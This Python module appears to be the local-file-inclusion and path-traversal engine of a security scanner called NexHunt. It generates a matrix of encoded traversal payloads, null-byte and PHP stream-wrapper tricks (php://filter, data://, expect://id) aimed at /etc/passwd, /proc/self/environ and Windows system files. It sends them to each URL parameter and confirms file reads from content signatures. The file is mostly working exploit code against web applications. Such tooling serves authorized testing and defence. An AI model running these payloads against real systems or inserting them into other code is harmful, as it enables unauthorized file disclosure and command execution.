"""
LFI / path-traversal engine — shared by the standalone tool (adapters/lfi.py)
and the crawl-fed pipeline (api/pipeline.py).

Detection is signature-based (file-content markers), not length-only, so hits
are confirmations rather than "the response changed". Payloads are generated as
target-file x bypass-technique, not a flat wordlist.
"""
import re
import base64
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

logger = logging.getLogger(__name__)

# Param names that commonly take a file/path argument. Used to rank which
# parameters to attack first (and, when capped, which to attack at all).
RANKED_PARAM_HINTS = (
    "file", "page", "path", "include", "inc", "template", "tpl", "lang",
    "doc", "document", "view", "cat", "dir", "folder", "download", "read",
    "load", "content", "root", "pg", "name", "filename", "filepath", "site",
    "action", "board", "conf", "config", "style", "layout", "module", "mod",
    "detail", "item", "show", "req", "retrieve", "prefix",
)

# Content signatures per target file.
_PASSWD = re.compile(r"root:.*?:0:0:")
_HOSTS = re.compile(r"127\.0\.0\.1\s+localhost")
_ENVIRON = re.compile(r"(DOCUMENT_ROOT|HTTP_USER_AGENT|SERVER_SOFTWARE|GATEWAY_INTERFACE)=")
_WININI = re.compile(r"\[(fonts|extensions|mci extensions|files)\]", re.I)
_BOOTINI = re.compile(r"\[boot loader\]", re.I)
_UID = re.compile(r"uid=\d+\(")
_MARKER = "NEXHUNTLFI7788"
_DATA_SIG = re.compile(_MARKER)

# (relative-path-from-root, signature)
_UNIX_TARGETS = [
    ("etc/passwd", _PASSWD),
    ("etc/hosts", _HOSTS),
    ("proc/self/environ", _ENVIRON),
]
_WIN_TARGETS = [
    ("windows/win.ini", _WININI),
    ("boot.ini", _BOOTINI),
    ("windows/system32/drivers/etc/hosts", _HOSTS),
]

_B64_BLOB = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")


def _b64_try_decode(body: str) -> str:
    """Return the longest decodable base64 blob in body (for php://filter reads)."""
    best = ""
    for m in _B64_BLOB.finditer(body):
        blob = m.group(0).rstrip("=")
        try:
            dec = base64.b64decode(blob + "=" * (-len(blob) % 4)).decode("utf-8", "ignore")
        except Exception:
            continue
        if len(dec) > len(best):
            best = dec
    return best or body


# Forward-slash traversal encoders: label -> fn(depth) producing the "../" prefix.
_SLASH_ENCODERS = [
    ("plain",       lambda n: "../" * n),
    ("url_full",    lambda n: "%2e%2e%2f" * n),
    ("double_enc",  lambda n: "%252e%252e%252f" * n),
    ("dotdotslash", lambda n: "....//" * n),
    ("semicolon",   lambda n: "..;/" * n),
    ("overlong",    lambda n: "..%c0%af" * n),
]
_BACKSLASH_ENCODERS = [
    ("win_plain", lambda n: "..\\" * n),
    ("win_url",   lambda n: "..%5c" * n),
]

_DEPTHS_THOROUGH = (1, 2, 3, 4, 6, 8, 10, 12)
_DEPTHS_FAST = (2, 4, 6, 8)
_FAST_ENCODERS = {"plain", "url_full", "double_enc", "dotdotslash"}


def generate_payloads(extra_wordlist: list[str] | None = None, thorough: bool = True) -> list[dict]:
    """Build the payload matrix. Each item: {value, technique, sig, b64}.
    sig=None means detect by baseline differential (used for user-supplied paths)."""
    depths = _DEPTHS_THOROUGH if thorough else _DEPTHS_FAST
    slash_encoders = _SLASH_ENCODERS if thorough else [e for e in _SLASH_ENCODERS if e[0] in _FAST_ENCODERS]
    payloads: list[dict] = []

    def add(value, technique, sig, b64=False):
        payloads.append({"value": value, "technique": technique, "sig": sig, "b64": b64})

    unix_targets = _UNIX_TARGETS if thorough else _UNIX_TARGETS[:1]
    win_targets = _WIN_TARGETS if thorough else _WIN_TARGETS[:1]

    for rel, sig in unix_targets:
        for label, fn in slash_encoders:
            for n in depths:
                add(fn(n) + rel, f"traversal-{label}", sig)
        add("/" + rel, "absolute", sig)
        # PHP < 5.3.4 null-byte truncation and path truncation
        add("../" * 8 + rel + "%00", "nullbyte", sig)
        add("../" * 8 + rel + "%00.png", "nullbyte-ext", sig)
        add("../" * 8 + rel + "/." * 32, "path-truncation", sig)

    for rel, sig in win_targets:
        for label, fn in slash_encoders:
            for n in depths:
                add(fn(n) + rel, f"traversal-{label}", sig)
        brel = rel.replace("/", "\\")
        for label, fn in _BACKSLASH_ENCODERS:
            for n in depths:
                add(fn(n) + brel, f"traversal-{label}", sig)
        add("/" + rel, "absolute-win", sig)

    # PHP stream wrappers
    add("php://filter/convert.base64-encode/resource=/etc/passwd", "php-filter", _PASSWD, b64=True)
    add("php://filter/read=convert.base64-encode/resource=/etc/passwd", "php-filter", _PASSWD, b64=True)
    add("data://text/plain;base64," + base64.b64encode(_MARKER.encode()).decode(), "data-wrapper", _DATA_SIG)
    add("expect://id", "expect-wrapper", _UID)

    for path in (extra_wordlist or []):
        path = path.strip()
        if not path:
            continue
        rel = path.lstrip("/\\")
        for n in depths:
            add("../" * n + rel, "traversal-plain", None)
        add(path if path.startswith("/") else "/" + rel, "absolute", None)

    return payloads


def rank_params(params: dict) -> list[str]:
    """Order param names by how likely they take a file path."""
    def rank(name: str) -> int:
        n = name.lower()
        val = params[name][0] if params[name] else ""
        if n in RANKED_PARAM_HINTS:
            score = 0
        elif any(h in n for h in RANKED_PARAM_HINTS):
            score = 1
        else:
            score = 4
        if "/" in val or "\\" in val or re.search(r"\.[A-Za-z0-9]{2,4}$", val):
            score = min(score, 1)
        return score

    return sorted(params.keys(), key=rank)


async def probe_url(
    url: str,
    headers: dict | None = None,
    extra_wordlist: list[str] | None = None,
    thorough: bool = True,
    max_params: int = 6,
) -> list[dict]:
    """Probe every parameter of url for LFI. Returns a list of finding dicts."""
    import httpx

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return []

    ranked = rank_params(params)[:max_params]
    payloads = generate_payloads(extra_wordlist, thorough)

    hdrs = {"User-Agent": "Mozilla/5.0 NexHunt LFI-Probe"}
    if headers:
        hdrs.update(headers)

    def build(param_name: str, value: str) -> str:
        # Keep our payload literal — urlencode would re-encode our deliberate
        # %2e/%c0%af sequences and turn them into a different technique.
        parts = []
        for k, vs in params.items():
            v = value if k == param_name else (vs[0] if vs else "")
            parts.append(f"{quote(k)}={v if k == param_name else quote(v)}")
        return urlunparse(parsed._replace(query="&".join(parts)))

    findings: list[dict] = []
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12) as client:
        try:
            base = await client.get(url, headers=hdrs)
            base_len = len(base.text)
        except Exception as e:
            logger.debug(f"LFI baseline failed for {url}: {e}")
            base_len = None

        for param_name in ranked:
            hit = False
            for p in payloads:
                if hit:
                    break
                try:
                    r = await client.get(build(param_name, p["value"]), headers=hdrs)
                except Exception:
                    continue

                body = r.text
                sig = p["sig"]
                matched = False
                evidence = ""

                if sig is None:
                    if base_len and r.status_code == 200 and abs(len(body) - base_len) > max(200, base_len * 0.3):
                        matched = True
                        evidence = f"status=200  len={len(body)}B  baseline={base_len}B (differential read, confirm manually)"
                else:
                    hay = _b64_try_decode(body) if p["b64"] else body
                    m = sig.search(hay)
                    if m:
                        matched = True
                        evidence = hay[max(0, m.start() - 30):m.end() + 140].strip()

                if matched:
                    findings.append({
                        "url": build(param_name, p["value"]),
                        "original_url": url,
                        "parameter": param_name,
                        "payload": p["value"],
                        "status_code": r.status_code,
                        "evidence": evidence[:400],
                        "technique": p["technique"],
                        "confidence": "confirmed" if sig is not None else "tentative",
                    })
                    hit = True

    return findings
